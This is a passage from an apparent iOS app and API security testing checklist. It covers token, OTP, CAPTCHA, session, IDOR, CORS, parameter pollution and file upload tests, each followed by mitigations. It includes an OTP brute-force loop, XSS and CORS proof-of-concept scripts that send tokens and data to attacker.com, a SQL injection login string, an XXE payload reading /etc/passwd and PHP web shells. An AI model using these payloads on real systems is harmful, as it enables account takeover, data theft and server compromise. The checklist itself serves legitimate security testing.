**Issue Description**: Token-based authentication must be properly implemented to prevent token theft, replay, and manipulation.

**Execution Steps**:
```bash
# Capture token from login response
# Test token properties:

# 1. Token expiration
Wait for extended period and retry request

# 2. Token structure (if JWT)
jwt.io website or:
echo "header.payload.signature" | base64 -d

# 3. Token in URL
Check if token appears in URLs or logs

# 4. Token validation
Modify token slightly and test
Remove signature from JWT
Change algorithm to "none"

# 5. Token replay
Use old/expired token
Use token from different user

# Using Burp Suite
1. Capture authenticated request
2. Send to Repeater
3. Modify Authorization header
4. Test various manipulations
```

**Expected Output**: Tokens should be validated, expire properly, and resist tampering.

**Vulnerability Confirmation**:
```
Vulnerabilities found:
- Token doesn't expire
- Weak signature (HS256 with weak secret)
- Algorithm confusion (RS256 to HS256)
- Token accepted without signature
- Token reuse after logout
- Token predictability
```

**Generic Mitigation**:
- Use strong signing algorithms (RS256, ES256)
- Implement token expiration (15-60 minutes)
- Validate signature server-side
- Use refresh tokens
- Invalidate tokens on logout
- Store tokens securely in Keychain
- Never expose tokens in URLs
- Implement token rotation

---

### 15. Bypassing CAPTCHA

**Issue Description**: Weak CAPTCHA implementations can be bypassed through automation, allowing brute force attacks.

**Execution Steps**:
```bash
# Test CAPTCHA bypass methods:

# 1. Reuse CAPTCHA token
Solve once, replay same solution

# 2. Client-side validation
Check if validation occurs only in JavaScript

# 3. Empty CAPTCHA value
Submit without solving CAPTCHA

# 4. Rate limiting without CAPTCHA
Check if CAPTCHA appears after rate limiting

# 5. Remove CAPTCHA parameter
Delete CAPTCHA field from request

# Using Burp Suite
1. Capture login request with CAPTCHA
2. Send multiple requests with same CAPTCHA
3. Try removing CAPTCHA parameters
4. Test with invalid CAPTCHA values
```

**Expected Output**: CAPTCHA should be mandatory, one-time use, and server-validated.

**Vulnerability Confirmation**:
```
Bypass successful if:
- Same CAPTCHA token works multiple times
- Request succeeds without CAPTCHA
- Client-side only validation
- CAPTCHA not linked to session
```

**Generic Mitigation**:
- Implement server-side CAPTCHA validation
- Use reputable CAPTCHA services (reCAPTCHA v3)
- One-time use CAPTCHA tokens
- Link CAPTCHA to user session
- Implement rate limiting before CAPTCHA
- Consider invisible CAPTCHA

---

### 16. Bypassing OTP

**Issue Description**: One-Time Password implementations may have flaws allowing bypass or brute force.

**Execution Steps**:
```bash
# Test OTP bypass methods:

# 1. Brute force OTP (if rate limiting missing)
for i in {000000..999999}; do
    curl -X POST https://api.example.com/verify-otp \
         -d "otp=$i&user=victim"
done

# 2. OTP reuse
Use the same OTP multiple times

# 3. Response manipulation
Change {"success": false} to {"success": true}

# 4. Race condition
Send multiple simultaneous requests

# 5. Session fixation
Use OTP sent to attacker's number

# 6. Check OTP in response/email
Sometimes OTP is leaked in responses

# Using Burp Suite Intruder
1. Capture OTP verification request
2. Set payload position on OTP field
3. Payload: Numbers 000000-999999
4. Check for rate limiting
```

**Expected Output**: OTP should be single-use, time-limited, and brute-force protected.

**Vulnerability Confirmation**:
```
Vulnerabilities:
- Predictable OTP (000001, 000002...)
- No rate limiting (can brute force)
- OTP reuse allowed
- Long validity period (>10 minutes)
- OTP visible in response
- 4-digit OTP (only 10,000 combinations)
```

**Generic Mitigation**:
- Use 6-digit random OTPs minimum
- Implement rate limiting (3-5 attempts)
- Set short expiration (5 minutes)
- Single-use OTPs
- Lock account after failed attempts
- Use secure random number generation
- Never expose OTP in responses
- Implement delays between attempts
- Consider alternative methods (app-based 2FA)

---

### 17. User Enumeration

**Issue Description**: Attackers can determine valid usernames through different responses for existing vs non-existing users.

**Execution Steps**:
```bash
# Test login responses
curl -X POST https://api.example.com/login \
     -d "username=validuser&password=wrong"
# Response: "Invalid password"

curl -X POST https://api.example.com/login \
     -d "username=invaliduser&password=wrong"
# Response: "User not found"

# Test registration
curl -X POST https://api.example.com/register \
     -d "username=existinguser"
# Response: "Username already exists"

# Test password reset
curl -X POST https://api.example.com/forgot-password \
     -d "email=valid@email.com"
# Response: "Reset link sent" vs "Email not found"

# Check timing differences
Use Burp Suite Intruder to compare response times
```

**Expected Output**: Generic error messages for all authentication failures.

**Vulnerability Confirmation**:
```
User enumeration possible through:
- Different error messages
- Different response codes
- Timing differences
- Different behavior (CAPTCHA only for valid users)
```

**Generic Mitigation**:
- Use generic error messages: "Invalid credentials"
- Same response for existing/non-existing users
- Normalize response times
- Rate limiting on username checks
- Monitor for enumeration attempts
- Consider CAPTCHA for password reset

---

### 18. Username/Password Policy

**Issue Description**: Weak password policies allow users to create easily guessable credentials.

**Execution Steps**:
```bash
# Test password policy during registration:

# 1. Minimum length
Try passwords: "a", "ab", "abc", "abcd"

# 2. Complexity requirements
Try passwords: "password", "Password", "Password1"

# 3. Common passwords
Try: "12345678", "password", "qwerty123"

# 4. Username in password
Username: john, Password: john123

# 5. Maximum length
Try very long password (1000+ characters)

# Test username policy:
- Minimum/maximum length
- Special characters allowed
- Case sensitivity
- Reserved names

# Using Burp Suite
1. Capture registration request
2. Send to Repeater
3. Test various password combinations
```

**Expected Output**: Strong password policy enforced server-side.

**Vulnerability Confirmation**:
```
Weak policy allows:
- Short passwords (< 8 characters)
- Common passwords
- No complexity requirements
- Username as password
- No password expiration
- Password history not checked
```

**Generic Mitigation**:
- Minimum 8 characters (12+ recommended)
- Require uppercase, lowercase, numbers, symbols
- Check against common password lists
- Prevent username in password
- Implement password strength meter
- Enforce server-side validation
- Regular password expiration
- Password history (prevent reuse)
- Account lockout after failed attempts

---

### 19. Leakage of Password Reset Link

**Issue Description**: Password reset tokens may be exposed through referrer headers, logs, or weak token generation.

**Execution Steps**:
```bash
# 1. Check reset link structure
https://example.com/reset?token=abc123

# 2. Token in referrer
Click external link from reset page
Check if token leaks via Referer header

# 3. Token predictability
Request multiple reset tokens
Analyze for patterns

# 4. Token reuse
Use same token multiple times

# 5. Token expiration
Wait extended period and test token

# 6. Token in logs
Check if reset links appear in:
- Access logs
- Analytics
- Third-party scripts

# Using Burp Suite
1. Request password reset
2. Capture email/response with reset link
3. Analyze token properties
4. Test token manipulations
```

**Expected Output**: Secure, one-time use, time-limited reset tokens.

**Vulnerability Confirmation**:
```
Issues found:
- Token in URL parameters (referrer leakage)
- Predictable tokens
- No expiration
- Token reuse allowed
- Token not invalidated after use
- Multiple valid tokens per user
```

**Generic Mitigation**:
- Use cryptographically random tokens
- POST request for token submission (not GET)
- Short expiration (15-30 minutes)
- Single-use tokens
- Invalidate all tokens after successful reset
- Rate limit reset requests
- Don't send token in email (send code separately)
- Implement referrer policy header
- Avoid external analytics on reset pages

---

## SESSION MANAGEMENT

### 20. Forced Browsing

**Issue Description**: Users can access unauthorized pages/features by directly navigating to URLs without proper authentication checks.

**Execution Steps**:
```bash
# Test common admin/privileged URLs:
https://app.example.com/admin
https://app.example.com/dashboard
https://app.example.com/settings
https://app.example.com/users
https://app.example.com/api/admin/users

# Without authentication
curl https://api.example.com/admin/users

# With low-privilege user session
# Capture regular user's token
curl -H "Authorization: Bearer <low_priv_token>" \
     https://api.example.com/admin/users

# Test direct object references
https://app.example.com/user/profile?id=1
https://app.example.com/user/profile?id=2

# Use DirBuster or similar tools
dirbuster -u https://app.example.com \
          -w /usr/share/wordlists/common.txt
```

**Expected Output**: All unauthorized access should return 401/403 errors.

**Vulnerability Confirmation**:
```
Successful forced browsing:
- Access admin panel without authentication
- View other users' data by changing IDs
- Access API endpoints without authorization
- Bypass navigation restrictions
```

**Generic Mitigation**:
- Implement authentication checks on all pages
- Server-side authorization validation
- Use role-based access control (RBAC)
- Implement proper session validation
- Use middleware for route protection
- Whitelist accessible routes per role
- Log unauthorized access attempts

---

### 21. Broken Authentication

**Issue Description**: Flaws in authentication mechanism allowing unauthorized access.

**Execution Steps**:
```bash
# Test various authentication bypasses:

# 1. SQL Injection
Username: admin' OR '1'='1
Password: anything

# 2. Credential stuffing
Use leaked credential databases

# 3. Session fixation
Set session ID before login

# 4. Weak credentials
Try default credentials: admin/admin

# 5. Missing authentication
Remove Authorization header entirely

# 6. JWT manipulation
Change "role": "user" to "role": "admin"

# 7. Remember me functionality
Check if "remember me" token is secure

# Using Burp Suite
1. Capture authentication flow
2. Test various bypass techniques
3. Analyze session management
```

**Expected Output**: Strong authentication mechanism resistant to bypasses.

**Vulnerability Confirmation**:
```
Broken authentication examples:
- SQL injection in login
- Predictable session IDs
- Default credentials work
- Session fixation possible
- Weak password reset
- Missing authentication checks
- Insecure "remember me"
```

**Generic Mitigation**:
- Use prepared statements (prevent SQLi)
- Strong password policies
- Multi-factor authentication
- Secure session management
- Account lockout policies
- Audit logging
- Regular security testing

---

### 22. Session Fixation

**Issue Description**: Attacker can hijack a user's session by forcing them to use a predetermined session ID.

**Execution Steps**:
```bash
# Test session fixation:

# 1. Obtain session ID before login
Visit app and capture session cookie
Session ID: ABC123

# 2. Force victim to use this session
Send link with fixed session:
https://app.example.com/?sessionid=ABC123

# 3. Victim logs in with fixed session

# 4. Attacker uses same session ID to access account

# Using Burp Suite
1. Access app before login, note session ID
2. Login with that session ID
3. Check if session ID changes after login
4. Test if old session ID still works

# Check cookie behavior
curl -c cookies.txt https://app.example.com/login
# Check if session cookie is set before authentication
```

**Expected Output**: New session ID generated after successful authentication.

**Vulnerability Confirmation**:
```
Vulnerable if:
- Session ID doesn't change after login
- Session ID accepted from URL parameter
- Pre-login session remains valid post-login
- Session ID can be set client-side

Not vulnerable:
- New session ID generated after login
- Old session invalidated
- Session ID only in secure cookie
```

**Generic Mitigation**:
- Regenerate session ID after authentication
- Invalidate old session on login
- Don't accept session ID from URL parameters
- Use secure, httpOnly cookies
- Implement CSRF tokens
- Validate session origin

---

### 23. Session Invalidation

**Issue Description**: Sessions should be properly terminated on logout, but may remain active.

**Execution Steps**:
```bash
# 1. Login and capture session token
curl -X POST https://api.example.com/login \
     -d "user=test&pass=test" -c cookies.txt

# 2. Perform authenticated actions
curl -b cookies.txt https://api.example.com/profile

# 3. Logout
curl -X POST https://api.example.com/logout -b cookies.txt

# 4. Try using old session token
curl -b cookies.txt https://api.example.com/profile

# Test in app:
1. Login to iOS app
2. Capture session token using proxy
3. Logout from app
4. Replay captured token in Burp
5. Check if access still granted

# Test token after password change
1. Login and save token
2. Change password
3. Use old token - should be invalid
```

**Expected Output**: All sessions invalidated after logout or password change.

**Vulnerability Confirmation**:
```
Session invalidation failed if:
- Token works after logout
- Token works after password change
- Only client-side logout
- Server doesn't track sessions
- No session revocation mechanism
```

**Generic Mitigation**:
- Server-side session invalidation on logout
- Invalidate all sessions on password change
- Implement session blacklist/revocation
- Set session expiration
- Clear local storage on logout
- Remove tokens from Keychain
- Provide "logout from all devices" option

---

### 24. Concurrent Logins

**Issue Description**: Multiple simultaneous logins from different locations may indicate account compromise or session sharing.

**Execution Steps**:
```bash
# Test concurrent sessions:

# 1. Login from device A
Login from iPhone, capture token A

# 2. Login from device B with same account
Login from iPad, capture token B

# 3. Test both tokens
curl -H "Authorization: Bearer TOKEN_A" \
     https://api.example.com/profile

curl -H "Authorization: Bearer TOKEN_B" \
     https://api.example.com/profile

# 4. Check if both work simultaneously
# 5. Check if app notifies about new login
# 6. Check if there's option to view active sessions
# 7. Check if there's option to terminate other sessions

# Test from different IPs:
- Login from home network
- Login from VPN
- Check if both sessions active
```

**Expected Output**: Depends on business requirements - may allow or restrict.

**Vulnerability Confirmation**:
```
Security concerns:
- Unlimited concurrent sessions
- No notification of new login
- Cannot view active sessions
- Cannot terminate other sessions
- No IP/device tracking
- Account sharing not detected
```

**Generic Mitigation**:
- Implement session limits per user
- Notify users of new logins (email/push)
- Show active sessions in settings
- Allow users to terminate sessions
- Track device/IP/location
- Option to disable concurrent logins
- Alert on suspicious login patterns
- Force re-authentication for sensitive actions

---

### 25. Session Hijacking

**Issue Description**: Attacker steals or intercepts session tokens to impersonate legitimate users.

**Execution Steps**:
```bash
# Test session hijacking vectors:

# 1. Network sniffing (if HTTP used)
tcpdump -i any -A | grep -i "authorization\|cookie"

# 2. XSS to steal tokens
<script>
fetch('https://attacker.com/?token=' + 
      localStorage.getItem('token'))
</script>

# 3. Session token in URL
https://app.example.com/page?session=ABC123
# Token leaked via Referer header

# 4. Predictable tokens
Request multiple sessions, analyze for patterns

# 5. Session token in logs
Check if tokens appear in application logs

# Using Burp Suite:
1. Capture legitimate session token
2. Use token in different browser/device
3. Check if validation occurs
4. Modify token slightly
5. Test token reuse

# Test token binding:
- Change User-Agent
- Change IP address
- Change device fingerprint
```

**Expected Output**: Sessions should be bound to device/IP and resist hijacking.

**Vulnerability Confirmation**:
```
Hijacking possible via:
- Tokens transmitted over HTTP
- Tokens in URL parameters
- Predictable token generation
- XSS vulnerabilities
- No token binding
- Tokens stored insecurely
- No IP/device validation
```

**Generic Mitigation**:
- Use HTTPS exclusively
- Store tokens in iOS Keychain
- Implement token binding (IP, device ID)
- Use secure random token generation
- Implement XSS protections
- Never put tokens in URLs
- Use short-lived tokens with refresh
- Implement anomaly detection
- Certificate pinning

---

### 26. Session Expiration

**Issue Description**: Sessions must expire after period of inactivity to limit exposure window.

**Execution Steps**:
```bash
# Test session expiration:

# 1. Login and capture token
curl -X POST https://api.example.com/login \
     -d "user=test&pass=test"
# Capture: Authorization: Bearer TOKEN123

# 2. Wait different time periods
# Test after: 15 min, 30 min, 1 hour, 24 hours

# 3. Use token after each period
curl -H "Authorization: Bearer TOKEN123" \
     https://api.example.com/profile

# Test idle timeout:
1. Login to app
2. Don't use app for extended period
3. Try to perform action
4. Check if re-authentication required

# Test absolute timeout:
1. Login to app
2. Keep using app continuously
3. Check if session expires after absolute time

# Using Burp Suite:
1. Capture authentication token
2. Schedule requests at intervals
3. Monitor when token becomes invalid
```

**Expected Output**: Sessions expire after inactivity period (15-30 min recommended).

**Vulnerability Confirmation**:
```
Issues found:
- Session never expires
- Very long expiration (>24 hours)
- No idle timeout
- No absolute timeout
- Refresh token never expires
- Token expiration only client-side
```

**Generic Mitigation**:
- Implement idle timeout (15-30 minutes)
- Implement absolute timeout (8-24 hours)
- Use refresh tokens with longer expiration
- Clear expired sessions from server
- Enforce server-side expiration
- Prompt re-authentication for sensitive actions
- Store expiration time server-side
- Include expiration in JWT claims

---

### 27. Session Predictability

**Issue Description**: Predictable session tokens allow attackers to guess valid session IDs.

**Execution Steps**:
```bash
# Collect multiple session tokens:

# Method 1: Multiple registrations
for i in {1..20}; do
    curl -X POST https://api.example.com/register \
         -d "user=test$i&pass=Pass123" \
         -c cookie$i.txt
    grep session cookie$i.txt
done

# Method 2: Sequential analysis
Session 1: 1000
Session 2: 1001
Session 3: 1002
# Predictable!

# Analyze tokens for patterns:
- Sequential numbers
- Timestamps
- User ID based
- Weak randomness

# Statistical analysis
1. Collect 50+ tokens
2. Look for patterns:
   - Incremental values
   - Timestamp correlation
   - Base64 decode and analyze
   - Check entropy

# Using Burp Sequencer:
1. Configure proxy
2. Send authentication to Sequencer
3. Capture 100+ tokens
4. Analyze randomness quality
```

**Expected Output**: Cryptographically random, high-entropy tokens.

**Vulnerability Confirmation**:
```
Predictable tokens examples:
- user123_1635789600 (username + timestamp)
- Sequential: 1001, 1002, 1003...
- MD5(username) or weak hashing
- Low entropy (< 128 bits)
- Reused across users

Burp Sequencer shows:
- Poor quality randomness
- Patterns detected
- Predictable bits
```

**Generic Mitigation**:
- Use cryptographically secure random generators
- Minimum 128-bit entropy
- UUID v4 or better
- Sign tokens with HMAC/JWT
- Avoid predictable inputs (timestamp, user ID)
- Regular security audits
- Use established libraries (not custom)

---

### 28. Sensitive Token Exposure in URL

**Issue Description**: Tokens in URLs can leak through browser history, logs, Referer headers, and bookmarks.

**Execution Steps**:
```bash
# Check for tokens in URLs:

# 1. Inspect authentication flow
Look for patterns like:
https://app.example.com/dashboard?token=ABC123
https://app.example.com/reset?session=XYZ789

# 2. Test Referer leakage
On page with token in URL, click external link:
curl -v https://external-site.com
# Check Referer header for token

# 3. Check redirect URLs
After login, check if redirected to:
https://app.example.com/home?auth=TOKEN

# 4. Password reset links
Email link: https://app.com/reset?token=RESET123

# Using Burp Suite:
1. Browse application with proxy
2. Check all URLs in HTTP History
3. Look for sensitive parameters in GET requests
4. Check for tokens in:
   - Query strings
   - Fragment (#token=...)
   - Path (/api/token/ABC123)

# Check browser history:
Open app, authenticate, check browser history
```

**Expected Output**: No sensitive tokens in URLs.

**Vulnerability Confirmation**:
```
Tokens found in:
- Query parameters: ?token=ABC123
- Fragment: #access_token=XYZ
- Path: /api/session/TOKEN123
- Redirects with tokens
- Password reset links

Leakage via:
- Browser history
- Server access logs
- Referer headers
- Bookmarks
- Shared links
```

**Generic Mitigation**:
- Use POST requests for authentication
- Store tokens in headers (Authorization)
- Use cookies with secure flags
- For OAuth, use authorization code flow
- Implement Referrer-Policy header
- For reset tokens, use POST to submit
- Never log URLs with tokens
- Sanitize logs to remove sensitive data

---

### 29. Weak Encryption of Session Token

**Issue Description**: Session tokens encrypted with weak algorithms can be decrypted by attackers.

**Execution Steps**:
```bash
# Analyze token encryption:

# 1. Capture session token
Authorization: Bearer eyJhbGciOiJIUzI1Ni...

# 2. Identify token type and encryption
# JWT tokens:
jwt.io - paste token to decode

# Check algorithm:
{
  "alg": "none"  # Vulnerable!
  "alg": "HS256" # Check key strength
  "alg": "RS256" # Recommended
}

# 3. Test weak algorithms
- none algorithm
- HS256 with weak secret
- Algorithm confusion (RS256 to HS256)

# 4. Try to decrypt/decode
# Base64 encoded:
echo "dG9rZW4xMjM=" | base64 -d

# Custom encryption:
Analyze for known weak ciphers:
- DES
- RC4  
- ECB mode

# Using tools:
# JWT manipulation
python3 jwt_tool.py TOKEN -T

# Check for:
- Unsigned tokens
- Weak signing keys
- Predictable encryption keys
- Hardcoded keys in app binary
```

**Expected Output**: Strong encryption with secure key management.

**Vulnerability Confirmation**:
```
Weak encryption found:
- Algorithm: none
- Weak HMAC secret ("secret", "key")
- Base64 encoding only (not encryption)
- Symmetric key in client app
- DES or RC4 encryption
- ECB mode usage
- Hardcoded encryption keys

Good implementation:
- RS256/ES256 with proper keys
- Strong HMAC secret (256+ bits)
- Key rotation implemented
- Keys stored securely server-side
```

**Generic Mitigation**:
- Use RS256 or ES256 for JWT
- Strong HMAC secrets (256+ bit random)
- Never use "none" algorithm
- Store keys securely (not in app)
- Implement key rotation
- Use AES-256 for symmetric encryption
- Use authenticated encryption (GCM mode)
- Regular security audits of crypto

---

## ACCESS CONTROL

### 30. HTTP Verb Tampering

**Issue Description**: Changing HTTP method may bypass access controls that only validate specific verbs.

**Execution Steps**:
```bash
# Test different HTTP methods on endpoints:

# 1. Identify protected endpoint
GET /api/users/123 → 403 Forbidden

# 2. Try different methods
POST /api/users/123
PUT /api/users/123
DELETE /api/users/123
PATCH /api/users/123
OPTIONS /api/users/123
HEAD /api/users/123

# 3. Test with X-HTTP-Method-Override
curl -X POST https://api.example.com/users/123 \
     -H "X-HTTP-Method-Override: DELETE"

# 4. Test with _method parameter
POST /api/users/123?_method=DELETE

# Using Burp Suite:
1. Send request to Repeater
2. Right-click → Change request method
3. Try all available methods
4. Check responses for different behavior

# Example attack:
GET /api/admin/users → 403
# Try:
POST /api/admin/users → 200 (bypassed!)
```

**Expected Output**: Access control enforced regardless of HTTP method.

**Vulnerability Confirmation**:
```
Bypass successful:
- GET denied but POST allowed
- DELETE restricted but PUT works
- Method override headers accepted
- Inconsistent authorization checks

Result: Unauthorized access or actions
```

**Generic Mitigation**:
- Validate authorization for all HTTP methods
- Disable unnecessary methods
- Ignore method override headers
- Use middleware for consistent checks
- Whitelist allowed methods per endpoint
- Test all methods during development

---

### 31. Testing for Insecure Direct Object Reference (IDOR)

**Issue Description**: Direct object references without authorization allow access to other users' data.

**Execution Steps**:
```bash
# Test IDOR vulnerabilities:

# 1. Identify object references
GET /api/users/profile?id=123
GET /api/documents/456
GET /api/orders/789

# 2. Create test accounts
User A ID: 123
User B ID: 456

# 3. Test horizontal privilege escalation
# Login as User A
curl -H "Authorization: Bearer USER_A_TOKEN" \
     https://api.example.com/profile?id=456
# Can you access User B's profile?

# 4. Test vertical privilege escalation
# Login as regular user
curl -H "Authorization: Bearer USER_TOKEN" \
     https://api.example.com/admin/users?id=1
# Can you access admin data?

# 5. Try different reference formats
- Numeric IDs: /user/1, /user/2
- UUIDs: /user/a1b2c3d4-...
- Emails: /user/test@example.com
- Usernames: /user/admin

# 6. Test in iOS app
Using proxy (Burp):
1. Login as User A
2. View your profile (ID: 123)
3. Intercept request
4. Change ID to 124, 125, 126
5. Check if other users' data returned

# Enumeration
for i in {1..100}; do
    curl -H "Authorization: Bearer TOKEN" \
         https://api.example.com/user/$i
done
```

**Expected Output**: Access denied for unauthorized object references.

**Vulnerability Confirmation**:
```
IDOR confirmed:
- User A can access User B's data
- Regular user can access admin data
- Can modify other users' resources
- Can delete other users' content
- Sequential ID enumeration successful

Examples:
/api/orders/1 (my order)
/api/orders/2 (someone else's order) - Accessible!
```

**Generic Mitigation**:
- Implement authorization checks for every request
- Verify user owns the resource
- Use indirect references (mapping)
- Use UUIDs instead of sequential IDs
- Implement access control lists (ACL)
- Log unauthorized access attempts
- Use user context for queries:
  ```sql
  SELECT * FROM orders 
  WHERE id = ? AND user_id = ?
  ```

---

### 32. Reflected File Download

**Issue Description**: Attacker can craft malicious downloadable files through the application.

**Execution Steps**:
```bash
# Test file download endpoints:

# 1. Identify download functionality
GET /api/download?file=report.pdf
GET /api/export?data=user_profile

# 2. Test reflected content
# Try to inject content into downloaded file:
GET /api/download?file=test.bat&content=malicious_code

# 3. Test MIME type manipulation
GET /api/download?file=test.pdf
# Response: Content-Type: application/pdf

# Try to change:
GET /api/download?file=test.bat
# Check if Content-Type changes to application/bat

# 4. Test Content-Disposition injection
GET /api/download?filename=report";.bat

# 5. Create malicious payloads
# Windows batch file:
@echo off
echo Malicious > C:\malware.txt

# Test in app:
1. Find export/download features
2. Intercept download request
3. Modify parameters
4. Check downloaded file content/type
```

**Expected Output**: Only legitimate, validated files can be downloaded.

**Vulnerability Confirmation**:
```
RFD vulnerability if:
- User input reflected in file content
- MIME type controlled by user
- Content-Disposition injectable
- Executable file types allowed
- No file content validation

Attack scenario:
User downloads "report.pdf"
Actually gets malicious.bat
```

**Generic Mitigation**:
- Validate and sanitize file names
- Set correct Content-Type server-side
- Use Content-Disposition: attachment
- Set X-Content-Type-Options: nosniff
- Whitelist allowed file extensions
- Store files with randomized names
- Scan files for malware
- Don't reflect user input in downloads

---

### 33. Cross-Origin Resource Sharing (CORS)

**Issue Description**: Misconfigured CORS allows unauthorized cross-origin requests.

**Execution Steps**:
```bash
# Test CORS configuration:

# 1. Basic CORS test
curl -H "Origin: https://evil.com" \
     https://api.example.com/endpoint -v

# Check response headers:
Access-Control-Allow-Origin: *  # Vulnerable!

# 2. Test with credentials
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=ABC123" \
     https://api.example.com/profile -v

# 3. Check preflight requests
curl -X OPTIONS \
     -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     https://api.example.com/endpoint -v

# 4. Test null origin
curl -H "Origin: null" \
     https://api.example.com/endpoint -v

# 5. Test subdomain bypass
If whitelist: app.example.com
Try: evil.app.example.com

# Create exploit POC:
# evil.html on attacker domain
<script>
fetch('https://api.example.com/sensitive-data', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    // Send stolen data to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Expected Output**: CORS should only allow trusted origins.

**Vulnerability Confirmation**:
```
Misconfigurations:
- Access-Control-Allow-Origin: *
  + Access-Control-Allow-Credentials: true
  = Severe vulnerability!

- Null origin accepted
- Regex bypass in origin validation
- All subdomains trusted
- Reflected origin without validation
```

**Generic Mitigation**:
- Whitelist specific trusted origins
- Never use wildcard with credentials
- Validate Origin header server-side
- Don't reflect Origin without checks
- Reject null origin
- Use strict subdomain validation
- Implement SameSite cookies
- Regular CORS policy reviews

---

### 34. Privilege Escalation

**Issue Description**: Users can elevate their privileges to access unauthorized functionality.

**Execution Steps**:
```bash
# Test privilege escalation:

# Horizontal escalation (same role, different user)
1. Login as User A
2. Capture request to modify User A's data:
   PUT /api/users/123 {"name": "New Name"}
3. Change user ID to another user:
   PUT /api/users/456 {"name": "Hacked"}
4. Check if modification successful

# Vertical escalation (to admin/higher role)

# Method 1: Parameter manipulation
POST /api/users/update
{
  "userId": 123,
  "role": "admin"  # Add admin role
}

# Method 2: JWT manipulation
# Original token:
{
  "sub": "123",
  "role": "user"
}
# Modified:
{
  "sub": "123",
  "role": "admin"  # Changed to admin
}

# Method 3: Cookie manipulation
# Original: role=user
# Modified: role=admin

# Method 4: Hidden parameters
POST /api/register
{
  "username": "test",
  "password": "pass",
  "isAdmin": true  # Hidden parameter
}

# Method 5: Mass assignment
POST /api/profile/update
{
  "name": "Test",
  "email": "test@test.com",
  "role": "admin",  # Not intended to be updatable
  "privileges": ["all"]
}

# Using Burp Suite:
1. Capture user registration/update
2. Add admin parameters
3. Capture profile requests
4. Modify role/permission fields
5. Test each modification

# Test in iOS app:
1. Login as regular user
2. Intercept API calls
3. Add/modify privilege parameters
4. Observe if changes accepted
```

**Expected Output**: Role changes rejected, proper authorization enforced.

**Vulnerability Confirmation**:
```
Escalation successful if:
- User can change own role
- Admin parameter accepted
- JWT role change works
- Cookie manipulation works
- Mass assignment allows privilege changes
- Can access admin endpoints
- Can perform admin actions

Result: Regular user gains admin access
```

**Generic Mitigation**:
- Never trust client-supplied roles/permissions
- Store roles server-side only
- Validate authorization on every request
- Use strong JWT signing
- Implement role-based access control (RBAC)
- Whitelist updatable fields (no mass assignment)
- Log privilege changes
- Separate admin/user APIs
- Regular authorization audits

---

## INPUT VALIDATION

### 35. HTTP Parameter Pollution

**Issue Description**: Sending duplicate parameters may cause unexpected behavior or bypass security controls.

**Execution Steps**:
```bash
# Test HPP scenarios:

# 1. Duplicate parameters in URL
GET /api/transfer?from=123&to=456&amount=100&to=999

# Server may use:
# - First value: to=456
# - Last value: to=999  
# - Array: to=[456, 999]
# - Concatenated: to=456,999

# 2. Test parameter precedence
POST /api/user/update
Body: role=user&name=Test&role=admin

# 3. Query string vs body
POST /api/endpoint?admin=false
Body: admin=true

# 4. Case sensitivity
user=victim&USER=attacker&User=hacker

# 5. Test in different contexts
# URL encoded
param=value1&param=value2

# JSON
{"param": "value1", "param": "value2"}

# Using Burp Suite:
1. Intercept request
2. Duplicate sensitive parameters
3. Try different values
4. Observe which value is used

# Real-world example:
# Transfer money
POST /api/transfer
from=attacker_account&to=victim_account
&amount=1&amount=1000

# If last value used: transfers $1000!
```

**Expected Output**: Application should reject or handle duplicates properly.

**Vulnerability Confirmation**:
```
HPP vulnerability if:
- Inconsistent parameter handling
- Security bypass possible
- Last parameter overrides security checks
- WAF bypassed by duplicate params
- Different values cause unexpected behavior

Example:
?user=victim&action=view&action=delete
If last action used: unauthorized deletion!
```

**Generic Mitigation**:
- Reject requests with duplicate parameters
- Define clear parameter precedence
- Validate all parameter occurrences
- Use strict parsing
- Implement input validation
- Test with security tools
- Document expected behavior

---

### 36. Checking for Content-Type Header Manipulation

**Issue Description**: Content-Type manipulation can bypass input validation and security controls.

**Execution Steps**:
```bash
# Test Content-Type manipulation:

# 1. Normal request
POST /api/upload
Content-Type: application/json
{"file": "test.jpg"}

# 2. Change Content-Type
POST /api/upload
Content-Type: text/xml
<?xml version="1.0"?>
<file>test.jpg</file>

# 3. Test XXE with XML
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<upload>&xxe;</upload>

# 4. Bypass file upload restrictions
POST /api/upload
Content-Type: image/jpeg
[Binary content of PHP shell]

# 5. JSON to form-data
# Original:
Content-Type: application/json
{"user": "test", "role": "user"}

# Modified:
Content-Type: application/x-www-form-urlencoded
user=test&role=admin

# Using Burp Suite:
1. Intercept POST request
2. Change Content-Type header
3. Modify body to match new type
4. Check if validation bypassed

# Test different types:
- application/json
- application/xml
- text/html
- multipart/form-data
- application/x-www-form-urlencoded
- text/plain
```

**Expected Output**: Consistent validation regardless of Content-Type.

**Vulnerability Confirmation**:
```
Vulnerable if:
- Different Content-Types have different validation
- XXE possible with XML Content-Type
- File upload filters bypassed
- Authentication bypass possible
- Server accepts unexpected Content-Types

Example:
JSON: {"file": "test.exe"} → Rejected
XML: <file>test.exe</file> → Accepted!
```

**Generic Mitigation**:
- Validate Content-Type header
- Whitelist allowed Content-Types
- Consistent input validation for all types
- Disable XML external entities (XXE)
- Verify actual content matches Content-Type
- Reject unexpected Content-Types
- Use Content-Type validation middleware

---

## FILE UPLOADS

### 37. Malicious File Upload

**Issue Description**: Uploading executable files can lead to remote code execution and server compromise.

**Execution Steps**:
```bash
# Test file upload vulnerabilities:

# 1. Upload executable files
# PHP shell:
<?php system($_GET['cmd']); ?>
# Save as: shell.php

# 2. Extension bypass techniques:
- Double extension: shell.php.jpg
- Null byte: shell.php%00.jpg
- Case variation: shell.PHP, shell.PhP
- Alternative extensions: .php5, .phtml
- MIME type tricks

# 3. Test in iOS app:
1. Find file upload feature
2. Intercept request in Burp
3. Change file extension
4. Modify Content-Type
5. Upload malicious file

# 4. Content-Type manipulation:
POST /api/upload
Content-Type: multipart/form-data
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

[PHP shell content]

# 5. Test file path traversal:
filename: ../../../shell.php
filename: ..\..\..\..\shell.php

# 6. Polyglot files:
Create file that's both valid image and PHP:
GIF89a<?php system($_GET['cmd']); ?>

# 7. Test upload location:
- Upload file
- Find where it's stored
- Try to execute: https://api.example.com/uploads/shell.php

# Using Burp Suite:
1. Capture upload request
2. Send to Repeater
3. Test various file types
4. Modify filename and Content-Type
